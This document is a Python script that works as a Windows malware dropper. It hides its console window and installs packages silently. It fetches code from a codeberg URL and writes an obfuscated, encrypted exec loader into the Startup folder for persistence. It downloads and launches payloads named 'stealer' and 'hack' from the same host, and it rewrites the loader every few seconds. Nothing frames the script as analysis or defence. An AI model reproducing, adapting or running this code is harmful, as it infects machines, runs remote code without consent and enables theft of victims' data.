import ctypes
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
import subprocess
subprocess.run("pip install cryptography", shell= True, capture_output= True)
subprocess.run("pip install requests", shell= True, capture_output= True)
import os
import requests
import zlib

import pickle
import zlib
import time
import base64
from cryptography.fernet import Fernet



def pack_encrypt(data):
    key = Fernet.generate_key()
    print("you key:"+str(key))
    cipher = Fernet(key)
    decrypt = pickle.dumps(cipher.decrypt)
    compressed_data = cipher.encrypt(pickle.dumps(data))
    return f"__import__('pickle').loads(__import__('pickle').loads({repr(decrypt)})({repr(compressed_data)}))"

APPDATA = os.getenv('APPDATA')
STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
stealer = os.path.join(os.getenv('TEMP'), "stealer.pyw")
steal4r = os.path.join(os.getenv('TEMP'), "steal4r.pyw")

try:
    # URL of the script to download
    URL = "https://codeberg.org/43a1723/hai1723/raw/branch/main/a/main.py"

    # Download the content from the URL
    r = requests.get(URL)
    
    # Encrypt and compress the content
    encrypted_content = zlib.compress(b"""
import urllib.request
import time

url = "https://codeberg.org/43a1723/hai1723/raw/branch/main/a/main.py"

while True:
    try:
        content = urllib.request.urlopen(url).read()
        exec(content)
        break
    except Exception as e:
        time.sleep(3)
""")

    # Python code to decrypt and execute the downloaded script
    code = f"""
import zlib
import subprocess
__import__('ctypes').windll.user32.ShowWindow(__import__('ctypes').windll.kernel32.GetConsoleWindow(), 0)
subprocess.run("pip install cryptography", shell= True, capture_output= True)
{pack_encrypt(exec)}({pack_encrypt(zlib.decompress)}({pack_encrypt(encrypted_content)}))
"""

    # Write the loader script to the Startup folder
    with open(os.path.join(STARTUP_PATH, "loader.pyw"), "w") as f:
        f.write(code)

except Exception as e:
    print(f"An error occurred: {e}")

payload = code

open(stealer, "wb").write(requests.get('https://codeberg.org/43a1723/hai1723/raw/branch/main/a/stealer.txt').content)
subprocess.Popen(["python", stealer], start_new_session=True)

open(steal4r, "wb").write(requests.get('https://codeberg.org/43a1723/hai1723/raw/branch/main/a/hack').content)
subprocess.Popen(["python", steal4r], start_new_session=True)
while True:
    with open(os.path.join(STARTUP_PATH, "loader.pyw"), "w") as f:
        f.write(payload)
    time.sleep(3)
